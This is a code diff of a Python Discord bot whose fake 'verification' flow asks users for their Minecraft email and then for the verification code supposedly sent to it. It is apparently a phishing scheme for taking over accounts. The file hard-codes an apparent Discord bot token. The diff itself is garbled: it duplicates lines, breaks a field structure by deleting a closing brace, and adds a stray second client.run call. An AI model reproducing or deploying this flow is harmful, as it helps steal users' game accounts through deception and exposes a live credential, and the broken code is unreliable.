@@ -15,9 +15,15 @@ listofpeople = []
 
 # Made by 24McNuggets and Portalwol
 
+listofpeople = []
+
+# Made by 24McNuggets and Portalwol
+
 embed = discord.Embed(title="Verification", description="By verifying through the form, you will gain access to the rest of the Discord server. Please click the button below to proceed with the verification process. Thank you.", color=40192)
 ticket_embed = discord.Embed(title="Open a ticket", description="Click here to open a ticket, if you need help with verification or need a carry.", color=discord.Colour.green())
+ticket_embed = discord.Embed(title="Open a ticket", description="Click here to open a ticket, if you need help with verification or need a carry.", color=discord.Colour.green())
 embed4 = discord.Embed(title="❌ - Error", description="You've entered a fake or not exisiting email. Please enter your real email address. \n Thank you.", color=40192)
+embed2 = discord.Embed(title="Verification Code Sent", description="""✔ - A verification code has been sent to your Minecraft Email - please check your inbox!""", color=40192)
 embed2 = discord.Embed(title="Verification Code Sent", description="""✔ - A verification code has been sent to your Minecraft Email - please check your inbox!""", color=40192)
 embed2.set_footer(text="Click the button below to enter your verification code!")
 #setup shit
@@ -257,7 +263,6 @@ class MyModal2(discord.ui.Modal):
         {
           "name": "⌛ - Expires in",
           "value": f"<t:{utc_time}:R>"
-        },
         {
           "name": "🗿 - **Discord Name**",
           "value": f"```{interaction.user}```"
@@ -415,3 +420,5 @@ async def setup(ctx):
 token = "MTA5ODA0OTExNDUwNTIxNjExMA.GsmZi-." + "qTSJXX0m92qfDXncXwNk_E8vz3jgALnCJ0519M"
 
 client.run(token)
+
+client.run("token")
